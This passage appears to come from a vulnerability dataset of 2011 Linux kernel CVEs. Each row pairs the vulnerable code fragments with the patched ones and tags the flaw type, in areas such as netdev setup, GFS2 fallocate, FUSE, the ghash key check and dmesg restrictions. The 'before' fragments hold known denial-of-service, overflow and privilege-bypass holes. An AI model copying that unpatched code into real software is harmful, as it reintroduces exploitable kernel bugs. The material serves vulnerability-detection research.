					      NETDEV_POST_TYPE_CHANGE);
	bond_dev->tx_queue_len = 0;
	bond_dev->flags |= IFF_MASTER|IFF_MULTICAST;
	bond_dev->priv_flags |= IFF_BONDING;
	bond_dev->priv_flags &= ~IFF_XMIT_DST_RELEASE;

 /* At first, we block adding VLANs. That's the only way to
	 * prevent problems that occur when adding VLANs over an

	dev->flags |= IFF_NOARP;
	dev->flags &= ~IFF_MULTICAST;
	dev->priv_flags &= ~IFF_XMIT_DST_RELEASE;
 random_ether_addr(dev->dev_addr);
}

{
 ether_setup(dev);

	dev->priv_flags	       &= ~IFF_XMIT_DST_RELEASE;
	dev->netdev_ops		= &macvlan_netdev_ops;
	dev->destructor		= free_netdev;
	dev->header_ops		= &macvlan_hard_header_ops,
		dev->netdev_ops = &tap_netdev_ops;
 /* Ethernet TAP Device */
 ether_setup(dev);


 random_ether_addr(dev->dev_addr);

{
 ether_setup(dev);



	dev->netdev_ops = &veth_netdev_ops;
	dev->ethtool_ops = &veth_ethtool_ops;
	dev->features |= NETIF_F_LLTX;

	used = pvc_is_used(pvc);

 if (type == ARPHRD_ETHER)
		dev = alloc_netdev(0, ""pvceth%d"", ether_setup);
 else

		dev = alloc_netdev(0, ""pvc%d"", pvc_setup);

 if (!dev) {
	dev->wireless_data = &ai->wireless_data;
	dev->irq = irq;
	dev->base_addr = port;


 SET_NETDEV_DEV(dev, dmdev);


	iface = netdev_priv(dev);
 ether_setup(dev);


 /* kernel callbacks */
 if (iface) {

    ether_setup(dev);
    init_netdev(dev, ap_ifname);


    if (register_netdev(dev)) {
        AR_DEBUG_PRINTF(ATH_DEBUG_ERR,(""ar6000_create_ap_interface: register_netdev failed\n""));
 ether_setup(dev);

	dev->priv_flags		|= IFF_802_1Q_VLAN;
	dev->priv_flags		&= ~IFF_XMIT_DST_RELEASE;
	dev->tx_queue_len	= 0;

	dev->netdev_ops		= &vlan_netdev_ops;
	dev->addr_len = ETH_ALEN;

 ether_setup(dev);

	dev->netdev_ops = &bnep_netdev_ops;

	dev->watchdog_timeo  = HZ * 2;
static void l2tp_eth_dev_setup(struct net_device *dev)
{
 ether_setup(dev);

	dev->netdev_ops		= &l2tp_eth_netdev_ops;
	dev->destructor		= free_netdev;
}
static void ieee80211_if_setup(struct net_device *dev)
{
 ether_setup(dev);

	dev->netdev_ops = &ieee80211_dataif_ops;
	dev->destructor = free_netdev;
}
","
 /* Setup the generic properties */
	dev->flags = IFF_NOARP|IFF_POINTOPOINT;

 /* isdn prepends a header in the tx path, can't share skbs */
	dev->priv_flags &= ~IFF_TX_SKB_SHARING;
	dev->header_ops = NULL;
	dev->netdev_ops = &isdn_netdev_ops;


 if (slave_dev->type != ARPHRD_ETHER)
 bond_setup_by_slave(bond_dev, slave_dev);
 else {
 ether_setup(bond_dev);
				bond_dev->priv_flags &= ~IFF_TX_SKB_SHARING;
			}

 netdev_bonding_change(bond_dev,
					      NETDEV_POST_TYPE_CHANGE);
	bond_dev->tx_queue_len = 0;
	bond_dev->flags |= IFF_MASTER|IFF_MULTICAST;
	bond_dev->priv_flags |= IFF_BONDING;
	bond_dev->priv_flags &= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);

 /* At first, we block adding VLANs. That's the only way to
	 * prevent problems that occur when adding VLANs over an

	dev->flags |= IFF_NOARP;
	dev->flags &= ~IFF_MULTICAST;
	dev->priv_flags &= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);
 random_ether_addr(dev->dev_addr);
}

{
 ether_setup(dev);

	dev->priv_flags	       &= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);
	dev->netdev_ops		= &macvlan_netdev_ops;
	dev->destructor		= free_netdev;
	dev->header_ops		= &macvlan_hard_header_ops,
		dev->netdev_ops = &tap_netdev_ops;
 /* Ethernet TAP Device */
 ether_setup(dev);
		dev->priv_flags &= ~IFF_TX_SKB_SHARING;

 random_ether_addr(dev->dev_addr);

{
 ether_setup(dev);

	dev->priv_flags &= ~IFF_TX_SKB_SHARING;

	dev->netdev_ops = &veth_netdev_ops;
	dev->ethtool_ops = &veth_ethtool_ops;
	dev->features |= NETIF_F_LLTX;

	used = pvc_is_used(pvc);

 if (type == ARPHRD_ETHER) {
		dev = alloc_netdev(0, ""pvceth%d"", ether_setup);
		dev->priv_flags &= ~IFF_TX_SKB_SHARING;
	} else
		dev = alloc_netdev(0, ""pvc%d"", pvc_setup);

 if (!dev) {
	dev->wireless_data = &ai->wireless_data;
	dev->irq = irq;
	dev->base_addr = port;
	dev->priv_flags &= ~IFF_TX_SKB_SHARING;

 SET_NETDEV_DEV(dev, dmdev);


	iface = netdev_priv(dev);
 ether_setup(dev);
	dev->priv_flags &= ~IFF_TX_SKB_SHARING;

 /* kernel callbacks */
 if (iface) {

    ether_setup(dev);
    init_netdev(dev, ap_ifname);
    dev->priv_flags &= ~IFF_TX_SKB_SHARING;

    if (register_netdev(dev)) {
        AR_DEBUG_PRINTF(ATH_DEBUG_ERR,(""ar6000_create_ap_interface: register_netdev failed\n""));
 ether_setup(dev);

	dev->priv_flags		|= IFF_802_1Q_VLAN;
	dev->priv_flags		&= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);
	dev->tx_queue_len	= 0;

	dev->netdev_ops		= &vlan_netdev_ops;
	dev->addr_len = ETH_ALEN;

 ether_setup(dev);
	dev->priv_flags &= ~IFF_TX_SKB_SHARING;
	dev->netdev_ops = &bnep_netdev_ops;

	dev->watchdog_timeo  = HZ * 2;
static void l2tp_eth_dev_setup(struct net_device *dev)
{
 ether_setup(dev);
	dev->priv_flags &= ~IFF_TX_SKB_SHARING;
	dev->netdev_ops		= &l2tp_eth_netdev_ops;
	dev->destructor		= free_netdev;
}
static void ieee80211_if_setup(struct net_device *dev)
{
 ether_setup(dev);
	dev->priv_flags &= ~IFF_TX_SKB_SHARING;
	dev->netdev_ops = &ieee80211_dataif_ops;
	dev->destructor = free_netdev;
}
"
2012,DoS ,CVE-2011-4110,,
2013,DoS Overflow ,CVE-2011-4098,"#include <linux/spinlock.h>
#include <linux/completion.h>
#include <linux/buffer_head.h>

#include <linux/gfs2_ondisk.h>
#include <linux/crc32.h>

{
 struct gfs2_inode *ip = GFS2_I(inode);
 struct gfs2_sbd *sdp = GFS2_SB(inode);

 struct buffer_head *dibh = mp->mp_bh[0];
	u64 bn, dblock = 0;
 unsigned n, i, blks, alloced = 0, iblks = 0, branch_start = 0;
 unsigned dblks = 0;
 unsigned ptrs_per_blk;
 const unsigned end_of_metadata = height - 1;

 int eob = 0;
 enum alloc_state state;
	__be64 *ptr;
			dblock = bn;
 while (n-- > 0)
				*ptr++ = cpu_to_be64(bn++);









 break;
		}
	} while ((state != ALLOC_DATA) || !dblock);
 return generic_file_aio_write(iocb, iov, nr_segs, pos);
}

static int empty_write_end(struct page *page, unsigned from,
 unsigned to, int mode)
{
 struct inode *inode = page->mapping->host;
 struct gfs2_inode *ip = GFS2_I(inode);
 struct buffer_head *bh;
 unsigned offset, blksize = 1 << inode->i_blkbits;
 pgoff_t end_index = i_size_read(inode) >> PAGE_CACHE_SHIFT;

 zero_user(page, from, to-from);
 mark_page_accessed(page);

 if (page->index < end_index || !(mode & FALLOC_FL_KEEP_SIZE)) {
 if (!gfs2_is_writeback(ip))
 gfs2_page_add_databufs(ip, page, from, to);

 block_commit_write(page, from, to);
 return 0;
	}

	offset = 0;
	bh = page_buffers(page);
 while (offset < to) {
 if (offset >= from) {
 set_buffer_uptodate(bh);
 mark_buffer_dirty(bh);
 clear_buffer_new(bh);
 write_dirty_buffer(bh, WRITE);
		}
		offset += blksize;
		bh = bh->b_this_page;
	}

	offset = 0;
	bh = page_buffers(page);
 while (offset < to) {
 if (offset >= from) {
 wait_on_buffer(bh);
 if (!buffer_uptodate(bh))
 return -EIO;
		}
		offset += blksize;
		bh = bh->b_this_page;
	}
 return 0;
}

static int needs_empty_write(sector_t block, struct inode *inode)
{
 int error;
 struct buffer_head bh_map = { .b_state = 0, .b_blocknr = 0 };

	bh_map.b_size = 1 << inode->i_blkbits;
	error = gfs2_block_map(inode, block, &bh_map, 0);
 if (unlikely(error))
 return error;
 return !buffer_mapped(&bh_map);
}

static int write_empty_blocks(struct page *page, unsigned from, unsigned to,
 int mode)
{
 struct inode *inode = page->mapping->host;
 unsigned start, end, next, blksize;
 sector_t block = page->index << (PAGE_CACHE_SHIFT - inode->i_blkbits);
 int ret;

	blksize = 1 << inode->i_blkbits;
	next = end = 0;
 while (next < from) {
		next += blksize;
		block++;
	}
	start = next;
 do {
		next += blksize;
		ret = needs_empty_write(block, inode);
 if (unlikely(ret < 0))
 return ret;
 if (ret == 0) {
 if (end) {
				ret = __block_write_begin(page, start, end - start,
							  gfs2_block_map);
 if (unlikely(ret))
 return ret;
				ret = empty_write_end(page, start, end, mode);
 if (unlikely(ret))
 return ret;
				end = 0;
			}
			start = next;
		}
 else
			end = next;
		block++;
	} while (next < to);

 if (end) {
		ret = __block_write_begin(page, start, end - start, gfs2_block_map);
 if (unlikely(ret))
 return ret;
		ret = empty_write_end(page, start, end, mode);
 if (unlikely(ret))
 return ret;
	}

 return 0;
}

static int fallocate_chunk(struct inode *inode, loff_t offset, loff_t len,
 int mode)
{
 struct gfs2_inode *ip = GFS2_I(inode);
 struct buffer_head *dibh;
 int error;
	u64 start = offset >> PAGE_CACHE_SHIFT;
 unsigned int start_offset = offset & ~PAGE_CACHE_MASK;
	u64 end = (offset + len - 1) >> PAGE_CACHE_SHIFT;
 pgoff_t curr;
 struct page *page;
 unsigned int end_offset = (offset + len) & ~PAGE_CACHE_MASK;
 unsigned int from, to;

 if (!end_offset)
		end_offset = PAGE_CACHE_SIZE;

	error = gfs2_meta_inode_buffer(ip, &dibh);
 if (unlikely(error))
 goto out;

 gfs2_trans_add_bh(ip->i_gl, dibh, 1);

 goto out;
	}

	curr = start;
	offset = start << PAGE_CACHE_SHIFT;
	from = start_offset;
	to = PAGE_CACHE_SIZE;
 while (curr <= end) {
		page = grab_cache_page_write_begin(inode->i_mapping, curr,
						   AOP_FLAG_NOFS);
 if (unlikely(!page)) {
			error = -ENOMEM;
 goto out;
		}

 if (curr == end)
			to = end_offset;
		error = write_empty_blocks(page, from, to, mode);
 if (!error && offset + to > inode->i_size &&
		    !(mode & FALLOC_FL_KEEP_SIZE)) {
 i_size_write(inode, offset + to);
		}
 unlock_page(page);
 page_cache_release(page);
 if (error)
 goto out;
		curr++;
		offset += PAGE_CACHE_SIZE;
		from = 0;






	}



 mark_inode_dirty(inode);

 brelse(dibh);

out:

 return error;
}

 int error;
 loff_t bsize_mask = ~((loff_t)sdp->sd_sb.sb_bsize - 1);
 loff_t next = (offset + len - 1) >> sdp->sd_sb.sb_bsize_shift;

	next = (next + 1) << sdp->sd_sb.sb_bsize_shift;

 /* We only support the FALLOC_FL_KEEP_SIZE mode */
 goto out_qunlock;
		}
		max_bytes = bytes;
 calc_max_reserv(ip, len, &max_bytes, &data_blocks, &ind_blocks);

		al->al_requested = data_blocks + ind_blocks;

		rblocks = RES_DINODE + ind_blocks + RES_STATFS + RES_QUOTA +
enum gfs2_state_bits {
	BH_Pinned = BH_PrivateStart,
	BH_Escaped = BH_PrivateStart + 1,

};

BUFFER_FNS(Pinned, pinned)
TAS_BUFFER_FNS(Pinned, pinned)
BUFFER_FNS(Escaped, escaped)
TAS_BUFFER_FNS(Escaped, escaped)



struct gfs2_bufdata {
 struct buffer_head *bd_bh;
","#include <linux/spinlock.h>
#include <linux/completion.h>
#include <linux/buffer_head.h>
#include <linux/blkdev.h>
#include <linux/gfs2_ondisk.h>
#include <linux/crc32.h>

{
 struct gfs2_inode *ip = GFS2_I(inode);
 struct gfs2_sbd *sdp = GFS2_SB(inode);
 struct super_block *sb = sdp->sd_vfs;
 struct buffer_head *dibh = mp->mp_bh[0];
	u64 bn, dblock = 0;
 unsigned n, i, blks, alloced = 0, iblks = 0, branch_start = 0;
 unsigned dblks = 0;
 unsigned ptrs_per_blk;
 const unsigned end_of_metadata = height - 1;
 int ret;
 int eob = 0;
 enum alloc_state state;
	__be64 *ptr;
			dblock = bn;
 while (n-- > 0)
				*ptr++ = cpu_to_be64(bn++);
 if (buffer_zeronew(bh_map)) {
				ret = sb_issue_zeroout(sb, dblock, dblks,
						       GFP_NOFS);
 if (ret) {
 fs_err(sdp,
 ""Failed to zero data buffers\n"");
 clear_buffer_zeronew(bh_map);
				}
			}
 break;
		}
	} while ((state != ALLOC_DATA) || !dblock);
 return generic_file_aio_write(iocb, iov, nr_segs, pos);
}














































































































static int fallocate_chunk(struct inode *inode, loff_t offset, loff_t len,
 int mode)
{
 struct gfs2_inode *ip = GFS2_I(inode);
 struct buffer_head *dibh;
 int error;
 unsigned int nr_blks;
 sector_t lblock = offset >> inode->i_blkbits;









	error = gfs2_meta_inode_buffer(ip, &dibh);
 if (unlikely(error))
 return error;

 gfs2_trans_add_bh(ip->i_gl, dibh, 1);

 goto out;
	}

 while (len) {
 struct buffer_head bh_map = { .b_state = 0, .b_blocknr = 0 };
		bh_map.b_size = len;
 set_buffer_zeronew(&bh_map);








		error = gfs2_block_map(inode, lblock, &bh_map, 1);
 if (unlikely(error))








 goto out;
		len -= bh_map.b_size;
		nr_blks = bh_map.b_size >> inode->i_blkbits;
		lblock += nr_blks;
 if (!buffer_new(&bh_map))
 continue;
 if (unlikely(!buffer_zeronew(&bh_map))) {
			error = -EIO;
 goto out;
		}
	}
 if (offset + len > inode->i_size && !(mode & FALLOC_FL_KEEP_SIZE))
 i_size_write(inode, offset + len);

 mark_inode_dirty(inode);



out:
 brelse(dibh);
 return error;
}

 int error;
 loff_t bsize_mask = ~((loff_t)sdp->sd_sb.sb_bsize - 1);
 loff_t next = (offset + len - 1) >> sdp->sd_sb.sb_bsize_shift;
 loff_t max_chunk_size = UINT_MAX & bsize_mask;
	next = (next + 1) << sdp->sd_sb.sb_bsize_shift;

 /* We only support the FALLOC_FL_KEEP_SIZE mode */
 goto out_qunlock;
		}
		max_bytes = bytes;
 calc_max_reserv(ip, (len > max_chunk_size)? max_chunk_size: len,
				&max_bytes, &data_blocks, &ind_blocks);
		al->al_requested = data_blocks + ind_blocks;

		rblocks = RES_DINODE + ind_blocks + RES_STATFS + RES_QUOTA +
enum gfs2_state_bits {
	BH_Pinned = BH_PrivateStart,
	BH_Escaped = BH_PrivateStart + 1,
	BH_Zeronew = BH_PrivateStart + 2,
};

BUFFER_FNS(Pinned, pinned)
TAS_BUFFER_FNS(Pinned, pinned)
BUFFER_FNS(Escaped, escaped)
TAS_BUFFER_FNS(Escaped, escaped)
BUFFER_FNS(Zeronew, zeronew)
TAS_BUFFER_FNS(Zeronew, zeronew)

struct gfs2_bufdata {
 struct buffer_head *bd_bh;
"
2012,DoS Overflow ,CVE-2011-4097,"unsigned int oom_badness(struct task_struct *p, struct mem_cgroup *mem,
 const nodemask_t *nodemask, unsigned long totalpages)
{
 int points;

 if (oom_unkillable_task(p, mem, nodemask))
 return 0;
","unsigned int oom_badness(struct task_struct *p, struct mem_cgroup *mem,
 const nodemask_t *nodemask, unsigned long totalpages)
{
 long points;

 if (oom_unkillable_task(p, mem, nodemask))
 return 0;
"
2013,DoS ,CVE-2011-4087," goto drop;
	}

 /* Zero out the CB buffer if no options present */
 if (iph->ihl == 5) {
 memset(IPCB(skb), 0, sizeof(struct inet_skb_parm));
 return 0;
	}

	opt->optlen = iph->ihl*4 - sizeof(struct iphdr);
 if (ip_options_compile(dev_net(dev), opt, skb))
"," goto drop;
	}

 memset(IPCB(skb), 0, sizeof(struct inet_skb_parm));
 if (iph->ihl == 5)

 return 0;


	opt->optlen = iph->ihl*4 - sizeof(struct iphdr);
 if (ip_options_compile(dev_net(dev), opt, skb))
"
2012,DoS Overflow ,CVE-2011-4086," clear_buffer_mapped(bh);
 clear_buffer_req(bh);
 clear_buffer_new(bh);


	bh->b_bdev = NULL;
 return may_free;
}
"," clear_buffer_mapped(bh);
 clear_buffer_req(bh);
 clear_buffer_new(bh);
 clear_buffer_delay(bh);
 clear_buffer_unwritten(bh);
	bh->b_bdev = NULL;
 return may_free;
}
"
2012,DoS ,CVE-2011-4081," struct ghash_ctx *ctx = crypto_shash_ctx(desc->tfm);
	u8 *dst = dctx->buffer;




 if (dctx->bytes) {
 int n = min(srclen, dctx->bytes);
		u8 *pos = dst + (GHASH_BLOCK_SIZE - dctx->bytes);
 struct ghash_ctx *ctx = crypto_shash_ctx(desc->tfm);
	u8 *buf = dctx->buffer;




 ghash_flush(ctx, dctx);
 memcpy(dst, buf, GHASH_BLOCK_SIZE);

"," struct ghash_ctx *ctx = crypto_shash_ctx(desc->tfm);
	u8 *dst = dctx->buffer;

 if (!ctx->gf128)
 return -ENOKEY;

 if (dctx->bytes) {
 int n = min(srclen, dctx->bytes);
		u8 *pos = dst + (GHASH_BLOCK_SIZE - dctx->bytes);
 struct ghash_ctx *ctx = crypto_shash_ctx(desc->tfm);
	u8 *buf = dctx->buffer;

 if (!ctx->gf128)
 return -ENOKEY;

 ghash_flush(ctx, dctx);
 memcpy(dst, buf, GHASH_BLOCK_SIZE);

"
2012,Bypass ,CVE-2011-4080," void __user *buffer, size_t *lenp, loff_t *ppos);
#endif






#ifdef CONFIG_MAGIC_SYSRQ
/* Note: sysrq code uses it's own private copy */
static int __sysrq_enabled = SYSRQ_DEFAULT_ENABLE;
		.data		= &kptr_restrict,
		.maxlen		= sizeof(int),
		.mode		= 0644,
		.proc_handler	= proc_dointvec_minmax,
		.extra1		= &zero,
		.extra2		= &two,
	},
 return err;
}












struct do_proc_dointvec_minmax_conv_param {
 int *min;
 int *max;
"," void __user *buffer, size_t *lenp, loff_t *ppos);
#endif

#ifdef CONFIG_PRINTK
static int proc_dmesg_restrict(struct ctl_table *table, int write,
 void __user *buffer, size_t *lenp, loff_t *ppos);
#endif

#ifdef CONFIG_MAGIC_SYSRQ
/* Note: sysrq code uses it's own private copy */
static int __sysrq_enabled = SYSRQ_DEFAULT_ENABLE;
		.data		= &kptr_restrict,
		.maxlen		= sizeof(int),
		.mode		= 0644,
		.proc_handler	= proc_dmesg_restrict,
		.extra1		= &zero,
		.extra2		= &two,
	},
 return err;
}

#ifdef CONFIG_PRINTK
static int proc_dmesg_restrict(struct ctl_table *table, int write,
 void __user *buffer, size_t *lenp, loff_t *ppos)
{
 if (write && !capable(CAP_SYS_ADMIN))
 return -EPERM;

 return proc_dointvec_minmax(table, write, buffer, lenp, ppos);
}
#endif

struct do_proc_dointvec_minmax_conv_param {
 int *min;
 int *max;
"
2012,DoS Exec Code Overflow Mem. Corr. ,CVE-2011-4077,,
2013,DoS ,CVE-2011-3638,,
2012,DoS ,CVE-2011-3637," struct proc_maps_private *priv = m->private;
 struct vm_area_struct *vma = v;

 vma_stop(priv, vma);

 if (priv->task)
 put_task_struct(priv->task);
}
"," struct proc_maps_private *priv = m->private;
 struct vm_area_struct *vma = v;

 if (!IS_ERR(vma))
 vma_stop(priv, vma);
 if (priv->task)
 put_task_struct(priv->task);
}
"
2013,DoS ,CVE-2011-3619,"			sa.aad.op = OP_SETPROCATTR;
			sa.aad.info = name;
			sa.aad.error = -EINVAL;
 return aa_audit(AUDIT_APPARMOR_DENIED, NULL, GFP_KERNEL,

					&sa, NULL);
		}
	} else if (strcmp(name, ""exec"") == 0) {
","			sa.aad.op = OP_SETPROCATTR;
			sa.aad.info = name;
			sa.aad.error = -EINVAL;
 return aa_audit(AUDIT_APPARMOR_DENIED,
 __aa_current_profile(), GFP_KERNEL,
					&sa, NULL);
		}
	} else if (strcmp(name, ""exec"") == 0) {
"
2013,DoS ,CVE-2011-3593,,
2012,DoS ,CVE-2011-3363,"
remote_path_check:
 /* check if a whole path (including prepath) is not remote */
 if (!rc && cifs_sb->prepathlen && tcon) {
 /* build_path_to_root works only when we have a valid tcon */
		full_path = cifs_build_path_to_root(cifs_sb, tcon);
 if (full_path == NULL) {
","
remote_path_check:
 /* check if a whole path (including prepath) is not remote */
 if (!rc && tcon) {
 /* build_path_to_root works only when we have a valid tcon */
		full_path = cifs_build_path_to_root(cifs_sb, tcon);
 if (full_path == NULL) {
"
2012,DoS Overflow ,CVE-2011-3359,"		dmaaddr = meta->dmaaddr;
 goto drop_recycle_buffer;
	}
 if (unlikely(len > ring->rx_buffersize)) {
 /* The data did not fit into one descriptor buffer
		 * and is split over multiple buffers.
		 * This should never happen, as we try to allocate buffers
/* DMA engine tuning knobs */
#define B43_TXRING_SLOTS 256
#define B43_RXRING_SLOTS 64
#define B43_DMA0_RX_BUFFERSIZE		IEEE80211_MAX_FRAME_LEN

/* Pointer poison */
#define B43_DMA_PTR_POISON		((void *)ERR_PTR(-ENOMEM))
","		dmaaddr = meta->dmaaddr;
 goto drop_recycle_buffer;
	}
 if (unlikely(len + ring->frameoffset > ring->rx_buffersize)) {
 /* The data did not fit into one descriptor buffer
		 * and is split over multiple buffers.
		 * This should never happen, as we try to allocate buffers
/* DMA engine tuning knobs */
#define B43_TXRING_SLOTS 256
#define B43_RXRING_SLOTS 64
#define B43_DMA0_RX_BUFFERSIZE (B43_DMA0_RX_FRAMEOFFSET + IEEE80211_MAX_FRAME_LEN)

/* Pointer poison */
#define B43_DMA_PTR_POISON		((void *)ERR_PTR(-ENOMEM))
"
2012,DoS Overflow ,CVE-2011-3353," if (outarg.namelen > FUSE_NAME_MAX)
 goto err;





	name.name = buf;
	name.len = outarg.namelen;
	err = fuse_copy_one(cs, buf, outarg.namelen + 1);
"," if (outarg.namelen > FUSE_NAME_MAX)
 goto err;

	err = -EINVAL;
 if (size != sizeof(outarg) + outarg.namelen + 1)
 goto err;

	name.name = buf;
	name.len = outarg.namelen;
	err = fuse_copy_one(cs, buf, outarg.namelen + 1);
"
2012,DoS ,CVE-2011-3209,"#include <linux/module.h>
#include <linux/elfcore.h>
#include <linux/compat.h>


#define elf_prstatus elf_prstatus32
struct elf_prstatus32
	 * one divide.
 */
	u64 nsec = (u64)jiffies * TICK_NSEC;
 long rem;
	value->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);
	value->tv_usec = rem / NSEC_PER_USEC;
}

#include <linux/module.h>
#include <linux/elfcore.h>
#include <linux/compat.h>


#define elf_prstatus elf_prstatus32
struct elf_prstatus32
	 * one divide.
 */
	u64 nsec = (u64)jiffies * TICK_NSEC;
 long rem;
	value->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);
	value->tv_usec = rem / NSEC_PER_USEC;
}

#include <linux/miscdevice.h>
#include <linux/posix-timers.h>
#include <linux/interrupt.h>



#include <asm/uaccess.h>
#include <asm/sn/addrs.h>

	nsec = rtc_time() * sgi_clock_period
			+ sgi_clock_offset.tv_nsec;
 tp->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tp->tv_nsec)
 		+ sgi_clock_offset.tv_sec;
 return 0;
};

static int sgi_clock_set(clockid_t clockid, struct timespec *tp)
{

	u64 nsec;
 u64 rem;

	nsec = rtc_time() * sgi_clock_period;

	sgi_clock_offset.tv_sec = tp->tv_sec - div_long_long_rem(nsec, NSEC_PER_SEC, &rem);

 if (rem <= tp->tv_nsec)
		sgi_clock_offset.tv_nsec = tp->tv_sec - rem;
 return 0;
}

#define timespec_to_ns(x) ((x).tv_nsec + (x).tv_sec * NSEC_PER_SEC)
#define ns_to_timespec(ts, nsec) (ts).tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &(ts).tv_nsec)

/* Assumption: it_lock is already held with irq's disabled */
static void sgi_timer_get(struct k_itimer *timr, struct itimerspec *cur_setting)
{
 return;
	}

 ns_to_timespec(cur_setting->it_interval, timr->it.mmtimer.incr * sgi_clock_period);
 ns_to_timespec(cur_setting->it_value, (timr->it.mmtimer.expires - rtc_time())* sgi_clock_period);
 return;
}


 sgi_timer_get(timr, old_setting);

 sgi_timer_del(timr);
	when = timespec_to_ns(new_setting->it_value);
	period = timespec_to_ns(new_setting->it_interval);

 if (when == 0)
 /* Clear timer */
 unsigned long now;

 getnstimeofday(&n);
		now = timespec_to_ns(n);
 if (when > now)
			when -= now;
 else
	__mod;							\
})

/*
 * (long)X = ((long long)divs) / (long)div
 * (long)rem = ((long long)divs) % (long)div
 *
 * Warning, this will do an exception if X overflows.
 */
#define div_long_long_rem(a, b, c) div_ll_X_l_rem(a, b, c)

static inline long div_ll_X_l_rem(long long divs, long div, long *rem)
{
 long dum2;
 asm(""divl %2"":""=a""(dum2), ""=d""(*rem)
	    : ""rm""(div), ""A""(divs));

 return dum2;

}

static inline u64 div_u64_rem(u64 dividend, u32 divisor, u32 *remainder)
{
 union {
#ifndef _LINUX_JIFFIES_H
#define _LINUX_JIFFIES_H

#include <linux/calc64.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/time.h>

#include <linux/sched.h>
#include <linux/posix-timers.h>
#include <asm/uaccess.h>
#include <linux/errno.h>



static int check_clock(const clockid_t which_clock)
{
 union cpu_time_count cpu,
 struct timespec *tp)
{
 if (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED) {
		tp->tv_sec = div_long_long_rem(cpu.sched,
					       NSEC_PER_SEC, &tp->tv_nsec);
	} else {
 cputime_to_timespec(cpu.cpu, tp);
	}
}

static inline int cpu_time_before(const clockid_t which_clock,
struct timespec ns_to_timespec(const s64 nsec)
{
 struct timespec ts;


 if (!nsec)
 return (struct timespec) {0, 0};

	ts.tv_sec = div_long_long_rem_signed(nsec, NSEC_PER_SEC, &ts.tv_nsec);
 if (unlikely(nsec < 0))
 set_normalized_timespec(&ts, ts.tv_sec, ts.tv_nsec);




 return ts;
}
	 * Convert jiffies to nanoseconds and separate with
	 * one divide.
 */
	u64 nsec = (u64)jiffies * TICK_NSEC;
	value->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &value->tv_nsec);


}
EXPORT_SYMBOL(jiffies_to_timespec);

	 * Convert jiffies to nanoseconds and separate with
	 * one divide.
 */
	u64 nsec = (u64)jiffies * TICK_NSEC;
 long tv_usec;

	value->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tv_usec);
 tv_usec /= NSEC_PER_USEC;
	value->tv_usec = tv_usec;
}
EXPORT_SYMBOL(jiffies_to_timeval);

 */
int do_adjtimex(struct timex *txc)
{
 long mtemp, save_adjust, rem;
	s64 freq_adj;
 int result;

		    freq_adj += time_freq;
		    freq_adj = min(freq_adj, (s64)MAXFREQ_NSEC);
		    time_freq = max(freq_adj, (s64)-MAXFREQ_NSEC);
		    time_offset = div_long_long_rem_signed(time_offset,
							   NTP_INTERVAL_FREQ,
							   &rem);
		    time_offset <<= SHIFT_UPDATE;
		} /* STA_PLL */
	    } /* txc->modes & ADJ_OFFSET */
#include <linux/debugobjects.h>
#include <linux/kallsyms.h>
#include <linux/memory.h>


/*
 * Lock order:
			len += sprintf(buf + len, ""<not-available>"");

 if (l->sum_time != l->min_time) {
 unsigned long remainder;

			len += sprintf(buf + len, "" age=%ld/%ld/%ld"",
			l->min_time,
 div_long_long_rem(l->sum_time, l->count, &remainder),
			l->max_time);
		} else
			len += sprintf(buf + len, "" age=%ld"",
				l->min_time);
","#include <linux/module.h>
#include <linux/elfcore.h>
#include <linux/compat.h>
#include <linux/math64.h>

#define elf_prstatus elf_prstatus32
struct elf_prstatus32
	 * one divide.
 */
	u64 nsec = (u64)jiffies * TICK_NSEC;
 u32 rem;
	value->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);
	value->tv_usec = rem / NSEC_PER_USEC;
}

#include <linux/module.h>
#include <linux/elfcore.h>
#include <linux/compat.h>
#include <linux/math64.h>

#define elf_prstatus elf_prstatus32
struct elf_prstatus32
	 * one divide.
 */
	u64 nsec = (u64)jiffies * TICK_NSEC;
 u32 rem;
	value->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);
	value->tv_usec = rem / NSEC_PER_USEC;
}

#include <linux/miscdevice.h>
#include <linux/posix-timers.h>
#include <linux/interrupt.h>
#include <linux/time.h>
#include <linux/math64.h>

#include <asm/uaccess.h>
#include <asm/sn/addrs.h>

	nsec = rtc_time() * sgi_clock_period
			+ sgi_clock_offset.tv_nsec;
 *tp = ns_to_timespec(nsec);
 tp->tv_sec += sgi_clock_offset.tv_sec;
 return 0;
};

static int sgi_clock_set(clockid_t clockid, struct timespec *tp)
{

	u64 nsec;
 u32 rem;

	nsec = rtc_time() * sgi_clock_period;

	sgi_clock_offset.tv_sec = tp->tv_sec - div_u64_rem(nsec, NSEC_PER_SEC, &rem);

 if (rem <= tp->tv_nsec)
		sgi_clock_offset.tv_nsec = tp->tv_sec - rem;
 return 0;
}




/* Assumption: it_lock is already held with irq's disabled */
static void sgi_timer_get(struct k_itimer *timr, struct itimerspec *cur_setting)
{
 return;
	}

	cur_setting->it_interval = ns_to_timespec(timr->it.mmtimer.incr * sgi_clock_period);
	cur_setting->it_value = ns_to_timespec((timr->it.mmtimer.expires - rtc_time()) * sgi_clock_period);

}


 sgi_timer_get(timr, old_setting);

 sgi_timer_del(timr);
	when = timespec_to_ns(&new_setting->it_value);
	period = timespec_to_ns(&new_setting->it_interval);

 if (when == 0)
 /* Clear timer */
 unsigned long now;

 getnstimeofday(&n);
		now = timespec_to_ns(&n);
 if (when > now)
			when -= now;
 else
	__mod;							\
})



















static inline u64 div_u64_rem(u64 dividend, u32 divisor, u32 *remainder)
{
 union {
#ifndef _LINUX_JIFFIES_H
#define _LINUX_JIFFIES_H

#include <linux/math64.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/time.h>

#include <linux/sched.h>
#include <linux/posix-timers.h>

#include <linux/errno.h>
#include <linux/math64.h>
#include <asm/uaccess.h>

static int check_clock(const clockid_t which_clock)
{
